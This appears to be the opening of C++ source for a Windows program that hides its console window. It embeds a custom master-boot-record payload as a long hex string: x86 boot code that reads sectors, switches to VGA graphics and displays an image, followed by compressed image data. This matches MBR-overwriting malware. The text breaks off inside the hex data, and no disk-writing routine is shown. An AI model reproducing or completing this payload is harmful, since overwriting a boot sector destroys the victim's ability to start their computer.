#include <iostream>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <Windows.h>
#include <windef.h>
#include <fstream>
#include <iosfwd>
#include <cmath>
#include "icondll.h"
#pragma comment(lib, "Winmm.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
using namespace std;
#define mbrsize 11264
#define boot "\xBB\xE0\x07\x8E\xC3\x8E\xDB\xB8\x16\x02\xB9\x02\x00\xB6\x00\xBB\x00\x00\xCD\x13\x31\xC0\x89\xC3\x89\xC1\x89\xC2\xBE\x00\x00\xBF\x52\x28\xAC\x81\xFE\x52\x28\x73\x31\x3C\x80\x73\x02\xEB\x0F\x24\x7F\x88\xC1\xAC\xAA\xFE\xC9\x80\xF9\xFF\x75\xF7\xEB\xE4\xB4\x00\x3C\x40\x72\x05\x24\x3F\x88\xC4\xAC\x89\xC1\xAD\x89\xF2\x89\xFE\x29\xC6\xAC\xAA\xE2\xFC\x89\xD6\xEB\xC8\xB8\x13\x00\xCD\x10\xBB\xE0\x07\x8E\xDB\xBE\x52\x28\xB4\x00\xAC\xBB\x00\x00\x89\xC1\xBA\xC8\x03\x88\xD8\xEE\x43\xBA\xC9\x03\xAC\xEE\xAC\xEE\xAC\xEE\xE2\xEE\xBB\x00\xA0\x8E\xC3\xBF\x00\x00\xB9\x00\x7D\xF3\xA5\xF4\xEB\xFD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\x94\xFF\x00\x00\x00\x06\x03\x06\x06\x03\x07\x0B\x02\x18\x3E\x3E\x3E\x3F\x3F\x3F\x07\x04\x04\x0C\x00\x85\x07\x03\x07\x03\x01\x01\x05\x06\x00\x90\x02\x02\x00\x01\x02\x01\x01\x04\x01\x02\x04\x01\x02\x03\x01\x02\x05\x05\x09\x00\x06\x0C\x00\x98\x01\x00\x01\x3F\x00\x00\x23\x00\x00\x21\x00\x00\x26\x00\x00\x19\x00\x00\x0B\x00\x03\x03\x01\x01\x23\x05\x09\x00\x89\x0B\x00\x03\x28\x00\x00\x01\x00\x00\x00\x04\x2D\x00\x81\x01\x0A\x04\x1B\x00\x96\x02\x0A\x00\x02\x0B\x00\x03\x22\x00\x00\x04\x01\x02\x25\x00\x00\x24\x00\x00\x28\x00\x00\x1B\x05\x30\x00\x06\x54\x00\x98\x0B\x00\x03\x02\x01\x01\x1E\x00\x00\x1F\x00\x00\x18\x00\x00\x02\x01\x02\x00\x01\x03\x05\x02\x03\x21\x05\x0C\x00\x80\x20\x05\x33\x00\x86\x0A\x00\x02\x0C\x00\x03\x27\x05\x45\x00\x05\x72\x00\x04\x18\x00\x86\x26\x00\x00\x1C\x00\x00\x17\x05\x39\x00\x83\x19\x00\x00\x1D\x04\x27\x00\x87\x03\x2D\x00\x00\x25\x00\x00\x2A\x05\x0C\x00\x82\x11\x00\x04\x08\xBA\x00\x8A\x01\x22\x00\x00\x0C\x00\x03\x0A\x00\x02\x1A\x05\x39\x00\x84\x0B\x00\x02\x04\x02\x04\x66\x00\x98\x11\x00\x04\x28\x00\x00\x12\x00\x05\x0F\x00\x03\x12\x00\x05\x10\x00\x04\x29\x00\x00\x0E\x00\x04\x26\x05\x30\x00\x82\x03\x01\x01\x05\x02\x01\x04\x8D\x00\x8C\x0A\x00\x02\x02\x01\x01\x07\x00\x02\x09\x00\x02\x21\x05\xAB\x00\x81\x0B\x00\x04\x1D\x01\x86\x06\x01\x03\x30\x00\x00\x32\x04\x30\x00\x84\x02\x2F\x00\x00\x30\x04\x3F\x00\x88\x03\x0A\x00\x03\x0F\x00\x03\x0E\x00\x04\x63\x00\x80\x08\x05\xBD\x00\x83\x08\x00\x02\x0A\x05\x23\x01\x83\x0D\x00\x03\x19\x05\xB7\x00\x81\x08\x00\x04\x9C\x00\x85\x20\x00\x00\x0F\x00\x04\x06\x4E\x00\x82\x24\x00\x00\x04\x6F\x00\x83\x02\x03\x03\x02\x04\x9F\x00\x8C\x06\x01\x03\x00\x02\x03\x39\x00\x00\x02\x00\x01\x31\x05\x90\x00\x80\x2E\x05\x69\x00\x89\x2A\x00\x00\x27\x00\x00\x14\x00\x04\x2A\x05\x30\x00\x80\x24\x05\x92\x01\x80\x10\x04\xC3\x00\x81\x04\x10\x05\xBA\x00\x83\x11\x00\x05\x30\x05\x2C\x01\x80\x0F\x07\xCF\x00\x8E\x03\x02\x00\x01\x0F\x00\x03\x03\x02\x03\x05\x01\x03\x05\x01\x04\xC3\x00\x84\x0F\x00\x04\x0A\x00\x04\x80\x01\x83\x06\x01\x02\x31\x04\x24\x00\x81\x02\x0E\x05\x92\x01\x80\x27\x04\x54\x00\x04\x01\x02\x86\x06\x00\x02\x1F\x00\x00\x06\x05\xE4\x00\x84\x19\x00\x00\x0D\x00\x04\xBF\x01\x83\x0C\x00\x03\x1A\x04\x6C\x00\x8A\x04\x0F\x00\x04\x0E\x00\x03\x20\x00\x00\x00\x05\x1A\x01\x80\x1D\x05\xD1\x01\x06\xC5\x01\x8C\x0C\x00\x03\x1C\x00\x00\x2D\x00\x00\x35\x00\x00\x29\x04\x2D\x00\x04\xC3\x00\x80\x2B\x04\x65\x01\x81\x02\x29\x05\xBA\x00\x05\x0C\x00\x04\x8A\x00\x80\x10\x05\x72\x00\x81\x04\x01\x04\x3F\x00\x80\x0E\x05\x5A\x00\x85\x0C\x00\x02\x08\x00\x02\x06\x1F\x02\x80\x0C\x05\x37\x02\x83\x1E\x00\x00\x1A\x05\x6E\x01\x87\x36\x00\x00\x34\x00\x00\x05\x02\x04\xE3\x01\x80\x3E\x05\xFF\x00\x8C\x11\x00\x05\x17\x00\x05\x04\x02\x02\x00\x02\x01\x33\x05\x87\x00\x81\x0B\x00\x04\x54\x00\x82\x12\x00\x05\x04\x34\x01\x82\x00\x00\x09\x04\xD5\x00\x89\x04\x27\x00\x00\x13\x00\x05\x11\x00\x04\x05\xAD\x00\x05\x05\x00\x0A\x0A\x00\x14\x14\x00\x28\x28\x00\x40\x50\x50\x00\x40\xA0\xA0\x00\x41\x40\x40\x01\x42\x80\x80\x02\x40\x9A\x9A\x00\x8B\x0C\x0C\x11\x11\x59\x59\x59\x59\x11\x11\x0C\x0C\x41\x40\x40\x01\x41\x34\x3C\x01\x8B\x38\x38\x59\x59\x6C\x6C\x6C\x6C\x59\x59\x38\x38\x41\x30\x44\x01\x41\x3D\x40\x01\x81\x0C\x0C\x05\x3C\x01\x8F\x8F\x8F\xC0\xC0\xFB\xFB\xFB\xFB\xC0\xC0\x8F\x8F\x38\x38\x38\x38\x41\x29\x43\x01\x41\x3C\x40\x01\x04\xB9\x03\x94\x5A\x5A\x38\x8F\x8F\xCC\xCC\x81\x81\x7E\x7E\xFE\xFE\xD1\xD1\xDB\xDB\x6C\x6C\x4A\x4A\x05\x44\x01\x41\x1E\xC7\x03\x9F\x0C\x0C\x29\x29\x67\x67\x8C\x8C\x8F\x8F\x3D\x4A\x4A\xB9\xB9\x1E\x1E\x3B\x3B\xE9\xE9\xEA\xEA\xDD\xDD\x78\x78\x12\x12\x24\x24\xF5\x04\x43\x01\x83\x5A\x5A\x70\x70\x41\x18\x44\x01\x41\x3C\x40\x01\x08\xED\x09\xA7\x7B\x7B\x7B\x7B\x01\x01\x38\x78\x78\x83\x83\x19\x19\x73\x73\xCF\xCF\xD2\xD2\x16\x16\x73\x73\x49\x49\x24\x24\x12\x24\x24\x3E\x3E\xB1\xB1\xEB\xEB\x71\x71\x29\x29\x41\x10\x44\x01\x41\x3C\x40\x01\x04\x3C\x01\x9E\x71\x71\x71\x71\xF5\xF5\x5B\x5B\x9E\x9E\x24\x24\xF5\xF5\x82\x63\x63\x72\x72\xEC\xEC\x5C\x5C\x3F\x3F\x4B\x4B\xCF\xCF\xED\xED\x04\x44\x01\x8E\xE5\xB3\xB3\x71\x71\x59\x59\x90\x90\x37\x37\x3A\x3A\xAA\xAA\x41\x0A\x4C\x06\x41\x3D\x40\x01\xBC\x0C\x0C\x11\x59\x59\x8D\x8D\xAA\xAA\xAA\xAA\x24\x24\x9E\x9E\x5D\x5D\xFB\xFB\xF6\xF6\x2A\x4B\x4B\x3C\x3C\xF0\xF0\xE6\xE6\xD7\xD7\xD0\xD0\x2D\x2D\xE2\xE2\x72\x72\x16\x16\xCF\xF0\xF0\x71\x71\x90\x90\x38\x38\x5D\x5D\xF0\xF0\xC0\xC0\x8D\x8D\x8D\x8D\x41\x03\x43\x01\x41\x3C\x40\x01\x06\xE6\x0E\x86\x5A\x24\x24\xFB\xFB\x8F\x8F\x04\x42\x01\x94\x9F\x9F\x99\x99\xC0\xC0\x24\x24\x24\x83\x83\xEE\xEE\xEF\xEF\x9E\x9E\xD8\xD8\xD8\xD8\x04\x82\x0C\x99\x31\x31\xB3\xB3\x24\xFD\xFD\xF0\xF0\x62\x62\x99\x99\xA1\xA1\xA1\xA1\x49\x49\x9F\x9F\x24\x24\x8F\x71\x71\x40\xFC\xC7\x03\x41\x3C\x40\x01\x04\x3C\x01\xA1\x8E\x8E\x8D\x8D\x8F\x8F\xF5\x9E\x9E\xC3\xC3\xC3\xC3\xF1\xF1\xDE\xDE\xF0\xF0\xF0\xF0\xF0\xF0\xFE\xFE\xD8\xC0\xC0\x5E\x5E\x77\x77\xF4\xF4\x04\x57\x06\x8C\xFB\xFB\xE3\xE3\xF2\xF2\xC6\xC6\xF2\x7E\x7E\xDE\xDE\x04\x4B\x01\x81\xD1\xD1\x04\xE6\x03\x8A\xFB\xFB\xC3\xC3\xBC\x3A\x3A\x90\x90\x90\x90\x40\xF4\xCF\x08\x41\x3C\x40\x01\x08\x2D\x0B\xAE\x24\x24\xC0\xC0\x6F\x6F\x7E\x74\x74\x28\x28\xB3\xB3\xF2\xF2\xF2\xF2\xE3\xE3\xF0\xF0\xEE\xEE\xA2\xA2\x99\x6D\x6D\xE0\xE0\x22\x22\x22\x22\xF4\xF4\xC9\xC9\x24\x24\x24\x24\x31\x31\x6C\x6C\xAA\x04\x2B\x01\x9C\x88\x88\x1A\x1A\x30\x30\xF8\xF8\xEE\xEE\x68\x68\x15\x15\x00\x00\x00\x82\x82\xEE\xEE\x90\x90\x8D\x8D\x29\x29\x92\x92\x41\x40\x40\x01\x40\xEC\x5A\x16\x94\x8F\x8F\xFB\xFB\xFD\xFD\x99\x99\xFB\xFB\xFE\xF3\xF3\x16\x16\xD2\xD2\x49\x49\xF5\xF5\x04\x94\x03\xB6\xC3\xC3\xF0\xF0\xCF\x16\x16\xF3\xF3\xC8\xC8\xF4\xF4\x30\x30\x7E\x7E\xF5\xF5\xE3\xE3\xFE\xFE\x99\x99\xC0\x24\x24\xFC\xFC\x16\x16\xED\xED\xCB\xCB\xDD\xDD\x91\x91\x16\x16\x75\x75\x46\x5C\x5C\x16\x16\x16\x16\x39\x39\x38\x38\x04\x5D\x01\x81\xAA\xAA\x40\xE2\x44\x01\x41\x3D\x40\x01\x84\x0C\xB5\xB5\x90\x90\x04\x3C\x01\x8A\x74\x74\xD4\xD4\xD4\xD4\xF6\xF6\xF7\xF7\xFD\x04\x96\x08\x92\xD0\xD0\x76\x76\x93\x93\x72\x72\x47\x47\x9E\x9E\x9E\x9E\xEF\xEF\x2D\x95\x95\x04\x38\x10\x85\xCF\xCF\x3B\x3B\x1B\x1B\x04\x44\x01\xA1\x94\x94\xA7\xA7\xFD\xF0\xF0\x34\x34\xA1\xA1\x95\x95\xCF\xCF\x95\x95\x4B\x4B\x95\x95\xEC\xEC\x72\x96\x96\x4B\x4B\x39\x39\xF0\xF0\xFD\xFD\x08\x03\x09\x81\x29\x29\x40\xDB\x4B\x06\x41\x3C\x40\x01\x99\x0C\x0C\x70\x70\x90\x90\x90\xE3\xE3\x12\x12\xB9\xB9\x77\x77\x74\x74\xDA\xDA\xF0\xF0\x99\x99\x5D\x5D\xFD\x04\xB4\x08\x94\x47\x47\xA1\xA1\x86\x86\xF0\xF0\x5F\x5F\x9E\x9E\x99\x99\x6D\x4C\x4C\x97\x97\x72\x72\x08\x44\x01\x81\x1F\x1F\x04\x44\x01\x9D\xDE\xF7\xF7\x66\x66\xC6\xC6\xC6\xC6\x83\x83\x4D\x4D\x4D\x4D\x98\x98\xD3\xD3\xA1\xE2\xE2\x9E\x9E\xFB\xFB\x9E\x9E\xF7\xF7\x04\x4C\x00\x86\xFB\xFB\xF4\xF4\x3A\x3A\xAA\x40\xD2\x62\x15\x98\x0C\x0C\x40\x40\x8E\x8E\x90\x90\x5E\x75\x75\xD2\xD2\x97\x97\xD4\xD4\xF8\xF8\xF9\xF9\xF9\xF9\xFA\xFA\x04\x40\x01\x84\x5D\xF0\xF0\xDD\xDD\x04\x43\x02\x04\x7C\x02\xB2\x5D\x5D\x99\x99\x99\x99\xF0\x2A\x2A\x19\x19\x2A\x2A\x9A\x9A\x72\x72\x91\x91\xED\xED\xD2\xD2\xA1\xA1\x41\x41\xFB\x5F\x5F\xC0\xC0\x65\x65\x21\x21\xB9\xB9\xD8\xD8\xCA\xCA\x63\x63\x48\x48\xFB\xC0\xC0\x5F\x5F\x05\x44\x00\x91\x5D\x5F\x5F\xFD\xFD\x47\x47\x47\x47\xF0\xF0\xF5\x8E\x8E\x38\x38\xB5\xB5\x40\xCC\x44\x01\x41\x3C\x40\x01\x90\x9B\x9B\x01\x01\x0A\x0A\x59\x59\x7E\x7E\xFB\xFB\xF0\x4D\x4D\xE9\xE9\x04\x6D\x07\xB4\x2B\x2B\xFA\xFA\xF8\xF8\xB9\xB9\xFD\xFD\xFD\xFD\x5F\xEF\xEF\xFD\xFD\xEF\xEF\xF7\xF7\x5D\x5D\x5B\x5B\x60\x60\x5B\x5B\xEE\xEE\xBA\xFC\xFC\xD5\xD5\xD6\xD6\x9C\x9C\x9D\x9D\xD7\xD7\xCF\xCF\xF3\xF3\x3B\x3B\xC0\xC0\xC3\x04\x2A\x05\x87\x5F\x5F\xFE\xFE\xFE\xFE\x62\x62\x04\x76\x01\x84\xC3\xC3\x9F\x9E\x9E\x04\x38\x01\x85\x5D\x5D\xA5\xA5\x4A\x4A\x05\x61\x00\x87\xF0\xEF\xEF\x4E\x6A\x6A\x37\x37\x04\x8F\x07\x40\xC6\xC8\x03\x41\x3C\x40\x01\x85\x5A\x5A\x06\x06\x06\x06\x04\x04\x00\x9B\xC3\xC3\x5D\x5D\xFD\xFD\xF7\xF0\xF0\xFC\xFC\x75\x75\xE9\xE9\xED\xED\x73\x73\xA1\xA1\x33\x33\xA2\xA2\x9E\x9E\x60\x04\x40\x01\x04\x49\x01\x85\x5B\x5B\x9F\x9F\x9F\x9F\x04\x84\x11\x8A\x28\x2C\x2C\x61\x61\xD6\xD6\xD0\xD0\x97\x97\x04\x5E\x07\x04\x95\x16\x86\xC0\xC0\x31\x78\x78\xB9\xB9\x04\x8B\x0C\x04\x39\x0A\x06\x2A\x0F\x80\xD8\x04\x2F\x0A\x9E\xFB\xFB\x62\x62\x6F\x6F\xBC\xBC\xFA\xFA\xE6\xE6\x72\x72\xCD\xCD\xB9\xB3\xB3\x4D\x4D\x75\x75\x83\x83\x59\x59\xD9\xD9\x40\x40\x40\xBC\x44\x01\x41\x3E\x40\x01\x81\x25\x25\x06\x3C\x01\xA5\x01\x01\x2E\x2E\xFE\xFE\x5D\x5D\x9F\x9F\xF0\xBF\xBF\x63\x63\x2A\x2A\x20\x20\x4D\x4D\x76\x76\x96\x96\x53\x53\x9E\x9E\x5B\x5B\x5D\x4F\x4F\xA0\xA0\x5B\x5B\x04\x89\x03\x04\x3C\x06\x8E\xF7\xF7\xC3\xC3\x99\xA1\xA1\xD7\xD7\xD7\xD7\xA1\xA1\xC1\xC1\x04\x62\x01\x8E\xF7\xF7\x87\x87\xB9\xB9\x09\xF8\xF8\x74\x74\xA1\xA1\xD5\xD5\x04\xBA\x03\x94\xEF\xEF\x5D\x5D\xDA\xDA\xDA\x82\x82\xE5\xE5\xDF\xDF\xB3\xB3\x64\x64\xE4\xE4\xF0\xF0\x04\x1C\x04\x84\xED\xED\x4C\xA3\xA3\x04\x07\x00\x89\x47\x47\xAA\xAA\xD9\xD9\x71\x71\xAC\xAC\x40\xB8\x42\x01\x41\x40\x40\x01\x96\x1C\x1C\x65\x65\x7B\x7B\xAC\xAC\xAC\xAC\x59\x59\x01\x01\xC0\xC0\x4F\x4F\x4F\xF0\xF0\x63\x63\x04\xFD\x0A\x83\x20\x20\xA1\xA1\x04\xEC\x05\x86\xFD\xFD\xC0\xC0\x8F\xF5\xF5\x04\x29\x24\x83\xA2\xA2\x99\x99\x06\x96\x03\x84\xF0\xF0\xD3\x95\x95\x04\x3C\x01\x81\x5B\x5B\x04\xF7\x03\x8C\x99\x99\x87\x87\x14\x14\xF2\xF2\x84\xBD\xBD\xCF\xCF\x04\x1A\x01\x83\x43\x43\xFB\xFB\x05\xB9\x0C\x89\xFD\xFD\x3C\x3C\x76\x76\x95\x95\xDD\xDD\x04\x7D\x01\x04\xCA\x03\x8C\x2D\x2D\xA1\xA1\x76\x57\x57\x83\x83\x65\x65\x90\x90\x04\x3D\x14\x83\x13\x13\x0D\x0D\x41\x40\x40\x01\x40\xB8\x40\x01\x8B\x09\x09\xA4\xA4\x65\x65\x50\x50\x11\x11\x01\x01\x06\xC8\x03\x92\x5E\xD0\xD0\x96\x96\x9A\x9A\xE6\xE6\xF0\xF0\xCB\xCB\x6D\x6D\xF0\xF0\x7E\x7E\x05\x37\x11\x81\x83\x83\x04\x40\x0B\x81\xFD\xFD\x06\x44\x01\x82\xCA\xCA\xF0\x04\xA9\x08\x04\x3C\x01\x9D\xD8\xD8\x60\x60\xA5\xA5\x4F\x4F\x9E\x9E\xEE\xEE\xFC\xEA\xEA\xA6\xA6\xCD\xCD\xD1\xD1\x71\x71\x24\x24\xA7\xA7\x9F\x9F\xF0\x04\x35\x00\x08\x73\x01\x83\xF0\xF0\x5D\x5D\x04\xFB\x03\x84\x9E\x9E\xD4\x65\x65\x04\x7E\x00\x89\xA8\xA8\x0F\x0F\x14\x14\x0D\x0D\x1C\x1C\x41\x40\x40\x01\x40\xBA\x40\x01\x92\x0F\x0F\x0F\x0F\x42\x42\x66\x66\x40\x40\x7B\x7B\xEB\xEB\x7B\x7B\x3A\x8F\x8F\x04\xEA\x00\x04\xFF\x05\x96\xF0\xF0\xDA\xDA\x15\x15\x21\x21\x6B\x6B\xD4\xCA\xCA\x2A\x2A\x1D\x1D\xD4\xD4\xC0\xC0\xA2\xA2\x04\x42\x0B\xAC\xEE\xEE\x9E\x24\x24\xC3\xC3\x4F\x4F\x5E\x5E\x79\x79\x79\x79\x62\x62\x5B\x5B\xF0\xF0\x6D\x6D\xF0\x6E\x6E\x6F\x6F\xF8\xF8\xF8\xF8\x88\x88\x2D\x2D\xDB\xDB\x23\x23\x2E\x2E\x9F\xF7\xF7\x04\xA6\x1B\x83\x99\x99\xEE\xEE\x04\x79\x01\x8E\x5D\x5D\xC0\xC0\x38\x38\x90\x8E\x8E\x09\x09\xA8\xA8\x50\x50\x04\xC1\x16\x04\x44\x04\x81\x0D\x0D\x41\x40\x40\x01\x40\xB8\x40\x01\x90\x25\x25\xB1\xB1\x24\x24\x70\x70\x25\x25\x10\x10\x50\x50\xDB\xDB\x8F\x06\xD1\x08\x81\xFB\xFB\x04\xF0\x05\xBE\x9E\x9E\x31\x31\xD4\xD4\x97\x97\x96\xD3\xD3\xCD\xCD\xB3\xB3\x6B\x6B\x84\x84\x3D\x3D\xE3\xE3\x78\x78\xF8\xF8\x6C\xDD\xDD\x7A\x7A\xDB\xDB\xFA\xFA\xA9\xA9\xA5\xA5\x24\x24\x7E\x7E\x9E\x9E\xF0\xF0\x41\xF8\xF8\xB0\xB0\xBE\xBE\x1D\x1D\xED\xED\xED\xED\x9A\x9A\x04\x85\x10\xA7\xF8\xBC\xBC\x87\x87\x5F\x5F\xA0\xA0\xFE\xFE\x4F\x4F\xC0\xC0\x71\x71\xAA\xAA\x7B\x7B\xAB\x2F\x2F\x51\x51\x66\x66\x6A\x6A\xBB\xBB\x82\x82\xB3\xB3\x22\x22\x23\x23\x41\x40\x40\x01\x40\xB8\x40\x01\x9C\x42\x42\xB1\xB1\xC3\xC3\xE4\xE4\xBB\xBB\xAC\xAC\x25\x25\x66\x66\x0F\x7B\x7B\x08\x08\x08\x08\x01\x01\x01\x01\xE4\xE4\x06\xFC\x05\x82\xBA\xBA\x68\x04\xC9\x08\x85\xC3\xC3\x74\x74\x50\x50\x04\x84\x1B\x8C\x22\x22\xBD\xBD\x95\xED\xED\x91\x91\x83\x83\x24\x24\x04\x46\x06\x94\x9E\x9E\xFE\xFE\xB3\xB3\xDA\xDA\x81\xDA\xDA\x2D\x2D\x2C\x2C\xD7\xD7\x9A\x9A\x96\x96\x04\x93\x25\xA3\x9A\x9A\xDA\xB9\xB9\x64\x64\xD8\xD8\x79\x79\xF5\xF5\x7B\x7B\x8D\x8D\x7B\x7B\x67\x67\x2F\x2F\x09\x6A\x6A\x6A\x6A\x0B\x0B\x92\x92\x2D\x2D\xEC\xEC\x04\x40\x01\x40\xBA\x40\x06\x41\x40\x40\x01\x04\x40\x01\x96\xFB\xFB\x31\x31\x7C\x7C\xAD\xAD\x6B\x6B\xAC\xAC\x25\x09\x09\x65\x65\x67\x67\x01\x01\x7B\x7B\x04\x6A\x03\x04\x09\x10\x05\x37\x15\x94\xA2\xA2\xAE\xAE\xC9\xC9\xB0\xB0\x22\x22\xD4\xD4\x95\x95\xED\xED\xED\x96\x96\x18\x18\x06\x53\x15\xA5\xF0\xF0\x4D\x4D\x4B\x4B\xCB\xCB\xEE\xEE\x2B\x95\x95\x76\x76\x4C\x4C\x2B\x2B\x5C\x5C\xD5\xD5\x75\x75\xA3\xA3\xE9\xE9\x96\x20\x20\xD4\xD4\xB1\xB1\xAB\xAB\x04\xB9\x2A\x98\x8C\x8C\xAA\xAA\x3A\x3A\x0D\x0D\x6A\xA4\xA4\x64\x64\xBB\xBB\x15\x15\x2D\x2D\xA6\xA6\xE0\xE0\xF9\xF9\x40\xB8\x40\x10\x41\x40\x40\x01\x06\x40\x06\xBA\x7D\x7D\x81\x81\xB9\xB9\x14\x14\xAF\xAF\x55\x55\x6B\xAC\xAC\x0E\x0E\xDB\xDB\x50\x50\xA4\xA4\xAB\xAB\xD9\xD9\x3A\x3A\xAC\xAC\xE3\xE3\xA2\xFE\xFE\xBE\xBE\xB9\xB9\x7E\x7E\x83\x83\xA1\xA1\x93\x93\xE9\xE9\x73\x73\x4B\x98\x98\xBA\xBA\x99\x99\x04\x25\x10\x83\xF0\xF0\x39\x39\x04\xEC\x0D\x99\xFD\xFD\x33\xA1\xA1\x47\x47\x60\x60\xD8\xD8\x18\x18\x9C\x9C\xEE\xEE\x62\x62\xF0\xF0\x2A\x2D\x2D\x6C\x6C\x04\x8A\x01\x9A\x67\x67\x40\x40\x3A\x3A\x37\x37\x6A\x6A\x10\x10\xF4\xEE\xEE\xEE\xEE\x92\x92\xF8\xF8\xDF\xDF\x43\x43\x6B\x6B\x40\xBA\xFE\x13\x06\x40\x01\x8E\x7E\x7E\xD4\xD4\xFC\xFC\xD4\xD4\xDB\xDB\xDB\xDB\x26\x3D\x3D\x04\x8D\x07\x94\xB0\xB0\x6A\x6A\xDC\xDC\x70\x70\x71\x71\x5A\x5A\xAA\xAA\x67\x7E\x7E\x81\x81\xCD\xCD\x04\xAB\x2B\x8C\x4B\x4B\x98\x98\x19\x19\x57\x57\x44\xA1\xA1\xE6\xE6\x04\x40\x01\x87\x99\x99\x79\x79\x7F\x7F\x7E\x7E\x04\x46\x24\x86\x24\xA7\xA7\x7A\x7A\x62\x62\x04\x3A\x24\x04\x30\x05\x84\xFB\xFB\x71\x71\xAA\x06\x0E\x1D\x83\x2F\x2F\x09\x09\x04\xED\x09\x96\xAA\xAA\x7E\x7E\x27\x27\x5E\x99\x99\x60\x60\xE0\xE0\x2D\x2D\xC1\xC1\x2D\x2D\x84\x84\xF9\xF9\x05\xE8\x21\x41\x40\x40\x01\x40\xB9\x40\x01\x9A\x6B\x6B\xD4\xD4\xF3\xF3\xB2\xB2\x9D\x9D\xD4\xD4\xDB\xBC\xBC\xAC\xAC\xF2\xF2\x7E\x7E\x6C\x6C\x22\x22\xB0\xB0\x04\x44\x01\x95\xAB\xAB\x7B\xAA\xAA\xEB\xEB\x1A\x1A\x9A\x9A\x95\x95\x4D\x4D\x3F\x3F\x3F\x3F\x3F\x3F\x2C\x04\xB2\x03\x96\xF7\xF7\xA2\xA2\xD8\xD8\x5E\x5E\xAD\xAD\xB3\xB3\x53\x53\x75\x75\xA1\xD8\xD8\xC0\xC0\x9E\x9E\x04\x26\x14\x88\xA2\xA2\xC0\xC0\xEB\xEB\x8E\x8E\x38\x04\x70\x07\x9E\x65\x65\x30\x30\x22\x22\x84\x84\x74\x74\x24\x24\x81\x81\x31\x31\x7A\xB4\xB4\xBB\xBB\x3B\x3B\x97\x97\xDD\xDD\x83\x83\x6B\x6B\x04\x84\x0C\x41\x40\x40\x01\x40\xB8\x40\x01\xA5\xB5\xB5\xB1\xB1\xB9\xB9\x5E\x5E\xD3\xD3\x4B\x4B\xB2\xB2\x72\x72\x3C\xD4\xD4\x3A\x3A\xF2\xF2\x54\x54\xDD\xDD\x79\x79\x70\x70\x6A\x6A\x12\x12\x0F\x0F\x11\x04\x98\x35\x9E\x90\x90\x8C\x8C\x83\x83\x3F\x3F\x75\x75\x4D\x4D\xB6\xB6\x98\x2C\x2C\x4C\x4C\xF0\xF0\xD1\xD1\xD8\xD8\xDA\xDA\x24\x24\xD8\xD8\x04\x63\x24\x82\xED\x2C\x2C\x04\x28\x1E\x85\xEF\xEF\xFB\xFB\xEB\xEB\x06\x35\x06\x8E\x51\xB7\xB7\x52\x52\xB0\xB0\x52\x52\xD4\xD4\x57\x57\x88\x88\x04\xBE\x03\x8A\x3E\x3E\xAD\x15\x15\x65\x65\x39\x39\x86\x86\x04\x3B\x00\x83\xBC\xBC\xB8\xB8\x40\xBA\x00\x0F\x41\x40\x40\x01\xAB\xB5\xB5\xB9\xB9\x6B\x6B\xBE\xBE\x68\x68\x9C\x9C\x61\x61\x4B\x4B\x93\xEA\xEA\x88\x88\x90\x90\xF5\xF5\x33\x33\xF0\xF0\x60\x60\x24\x24\x2F\x2F\x29\x29\x25\x13\x13\xF1\xF1\x7B\x7B\x04\xA0\x20\x04\x44\x01\x88\x98\x98\x75\x75\xD7\xA1\xA1\xEE\xEE\x04\x58\x11\x04\x0B\x06\x90\x24\x24\x8E\x8E\x71\x71\xF0\xF0\x3C\x75\x75\x4B\x4B\xD4\xD4\xAA\xAA\x04\x4E\x14\x9D\xEB\xEB\x40\x40\x1C\x1C\x6A\x32\x32\x50\x50\xF9\xF9\xA8\xA8\x1D\x1D\x2C\x2C\xD4\xD4\x7E\x7E\x1B\x1B\x3E\x3E\x7E\x23\x23\x04\x34\x04\x89\x31\x31\x7E\x7E\xE4\xE4\xB9\xB9\x32\x32\x41\x40\x40\x01\x40\xBA\x40\x01\x85\x51\x51\x67\x67\x71\x71\x04\xFF\x05\x92\x33\x33\x34\x34\x8A\x8A\x20\xCF\xCF\x18\x18\x24\x24\xDE\xDE\xEE\xEE\xF0\xF0\x04\x5A\x1B\x04\xCF\x22\x86\xAC\x37\x37\x37\x37\xAA\xAA\x04\x89\x08\x08\x44\x01\x84\x3F\xA3\xA3\xD3\xD3\x04\x84\x16\x04\x22\x0F\x81\x99\x99\x04\x19\x1E\x88\x24\x24\xC0\xD4\xD4\x8F\x8F\x90\x90\x04\x52\x00\xAB\xD9\xD9\x65\x65\x6A\x6A\x22\x22\x40\x78\x78\x6